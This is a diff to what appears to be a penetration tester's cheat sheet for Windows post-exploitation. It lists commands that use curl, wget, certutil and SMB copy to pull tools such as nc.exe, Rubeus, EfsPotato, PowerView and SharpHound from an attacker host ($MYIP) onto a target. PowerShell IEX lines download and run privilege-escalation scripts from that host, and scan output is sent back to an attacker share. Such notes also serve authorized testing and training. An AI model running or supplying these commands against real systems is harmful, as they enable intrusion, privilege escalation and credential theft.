@@ -1711,22 +1711,24 @@ python3 -m http.server 139 /Upload
 impacket-smbserver share /Upload/windows
 
 -->> Transfer
-curl http://$MYIP:53/windows/nc.exe -o \programdata\nc.exe
-curl http://$MYIP:53/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
-curl http://$MYIP:53/windows/PowerView.ps1 -o \programdata\PowerView.ps1
-curl http://$MYIP:53/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
-curl http://$MYIP:53/windows/Rubeus.exe -o \programdata\Rubeus.exe
-curl http://$MYIP:53/bat2exe.bat -o \programdata\bat2exe.bat
-wget http://$MYIP:53/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP/windows/SharpHound.exe -o \programdata\SharpHound.exe
+curl http://$MYIP/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+curl http://$MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
+curl http://$MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
+curl http://$MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
+curl http://$MYIP/bat2exe.bat -o \programdata\bat2exe.bat
+wget http://$MYIP/windows/nc.exe -o \programdata\nc.exe
 copy \\$MYIP\$\nc.exe \programdata
-certutil -urlcache -f http://$MYIP:53/windows/nc.exe \programdata\nc.exe
+certutil -urlcache -f http://$MYIP/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/whoami')
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 
 +---------- Full Privesc Scan ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/windows/PrivescCheck.ps1');Invoke-PrivescCheck
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
 
